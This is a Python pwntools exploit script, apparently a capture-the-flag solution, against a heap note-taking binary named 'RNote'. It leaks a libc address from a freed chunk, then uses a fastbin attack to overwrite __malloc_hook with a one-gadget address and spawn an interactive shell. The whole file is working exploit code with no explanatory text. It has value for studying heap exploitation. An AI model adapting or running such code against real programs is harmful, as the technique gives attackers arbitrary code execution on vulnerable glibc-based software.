from pwn import *
p = process("./RNote")
elf = ELF("./RNote")
libc = elf.libc

def addNewNote(size, title, content):
    p.sendafter("Your choice: ", "1")
    p.sendafter("size: ", str(size))
    p.sendlineafter("title: ", title)
    p.sendlineafter("content: ", content)
def deleteANote(idx):
    p.sendlineafter("Your choice: ", "2")
    p.sendlineafter("delete: ", str(idx))

def showANote(idx):
    p.sendafter("Your choice: ", "3")
    p.sendafter("show: ", str(idx))

if __name__ == "__main__":
    addNewNote(256, "a" * 4, "b" * 4)
    addNewNote(256, "c" * 4, "d" * 4)
    pause()
    deleteANote(0)
    addNewNote(256, "e" * 4, "b" * 7)
    showANote(0)
    p.recvuntil("b" * 7 + "\n")
    libc_base = u64(p.recv(6).ljust(8, "\x00")) - 88 - 0x10 - libc.symbols['__malloc_hook']
    __malloc_hook = libc_base + libc.symbols['__malloc_hook']
    oneshot = libc_base + 0xf1207
    p.info("libc_base : " + hex(libc_base))
    p.info("__malloc_hook : " + hex(__malloc_hook))
    deleteANote(0)
    deleteANote(1)
    deleteANote(2)

    addNewNote(96, "a" * 4, "b" * 4)
    addNewNote(96, "b" * 4, "c" * 4)
    addNewNote(96, "c" * 16 + "\x10", "b" * 4)

    deleteANote(0)
    deleteANote(1)
    deleteANote(2)

    addNewNote(96, "a", p64(__malloc_hook - 0x23))
    addNewNote(96, "b", "d")
    addNewNote(96, "c", "e")
    addNewNote(96, p64(oneshot), "a" * 19 + p64(oneshot))
    p.interactive()

